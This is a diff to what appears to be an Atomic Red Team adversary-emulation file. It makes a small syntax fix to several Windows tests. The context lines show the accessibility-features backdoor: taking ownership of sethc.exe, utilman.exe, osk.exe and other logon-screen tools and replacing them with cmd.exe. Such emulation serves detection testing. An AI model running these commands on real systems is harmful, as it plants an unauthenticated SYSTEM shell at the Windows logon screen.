@@ -54,7 +54,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
+      (IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ))
       takeown /F C:\Windows\System32\sethc.exe /A
       icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
@@ -70,7 +70,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
+      (IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd ))
       takeown /F %windir%\System32\osk.exe /A
       icacls %windir%\System32\osk.exe /grant Administrators:F /t
       del %windir%\System32\osk.exe
@@ -129,7 +129,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
+      (IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd ))
       takeown /F C:\Windows\System32\utilman.exe /A
       icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
@@ -145,7 +145,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
+      (IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ))
       takeown /F C:\Windows\System32\Magnify.exe /A
       icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
@@ -161,7 +161,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
+      (IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd ))
       takeown /F C:\Windows\System32\Narrator.exe /A
       icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
@@ -177,7 +177,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd )
+      (IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd ))
       takeown /F C:\Windows\System32\DisplaySwitch.exe /A
       icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
@@ -193,7 +193,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd )
+      (IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd ))
       takeown /F C:\Windows\System32\AtBroker.exe /A
       icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
